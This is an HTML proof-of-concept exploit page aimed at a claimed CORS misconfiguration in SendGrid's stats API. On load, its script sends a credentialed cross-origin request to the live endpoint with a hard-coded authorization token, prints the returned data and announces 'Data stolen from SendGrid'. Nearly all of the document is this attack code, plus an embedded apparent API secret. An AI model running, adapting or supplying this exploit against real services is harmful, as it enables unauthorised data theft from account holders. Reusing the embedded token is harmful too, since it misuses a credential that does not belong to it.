<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Exploit: SendGrid CORS Misconfiguration</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background-color: #0d1117; color: #58a6ff; padding: 50px; }
        .console { background-color: #161b22; border: 1px solid #30363d; padding: 20px; border-radius: 6px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        h1 { color: #f85149; font-size: 1.5rem; }
        .loading { color: #d29922; }
        .success { color: #3fb950; font-weight: bold; }
        #data-output { color: #c9d1d9; word-wrap: break-word; white-space: pre-wrap; margin-top: 15px; border-top: 1px solid #30363d; padding-top: 10px; }
    </style>
</head>
<body>

<div class="console">
    <h1>[!] CORS Exploit Initialized</h1>
    <p>Target: <code>api.sendgrid.com/v3/stats</code></p>
    <div id="status" class="loading">[*] Waiting for execution...</div>
    <div id="data-output"></div>
</div>

<script>
    window.onload = function() {
        const status = document.getElementById('status');
        const output = document.getElementById('data-output');
        
        const targetUrl = "https://api.sendgrid.com/v3/stats?aggregated_by=week&start_date=2023-05-27";

        status.innerHTML = "[*] Sending cross-origin request with credentials...";

        fetch(targetUrl, {
            method: "GET",
            mode: "cors",
            credentials: "include",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "token B2AB7UQHM7QSAIWJ.7TXCADQD6DKRRJNIQNP5INSG56GNZAYCLB6J5G4ZLC6HXKJZRCZRFITVIQ6YBYD7JZML5NHOZX75WHGTSKCEH4QV"
            }
        })
        .then(response => {
            if (response.ok) {
                status.innerHTML = "<span class='success'>[+] VULNERABILITY CONFIRMED! Data extracted.</span>";
                return response.json();
            } else {
                status.innerHTML = "<span style='color:#f85149;'>[-] Failed. Status: " + response.status + " (The server might have blocked the Origin)</span>";
                throw new Error("Response not OK");
            }
        })
        .then(data => {
            output.innerText = JSON.stringify(data, null, 2);
            alert("SUCCESS! Data stolen from SendGrid:\n" + JSON.stringify(data).substring(0, 300));
        })
        .catch(error => {
            console.error("CORS Error:", error);
            if (status.innerHTML.indexOf("Failed") === -1) {
                status.innerHTML = "<span style='color:#f85149;'>[-] CORS Policy Blocked the reading of the response.</span>";
            }
        });
    };
</script>

</body>
</html>
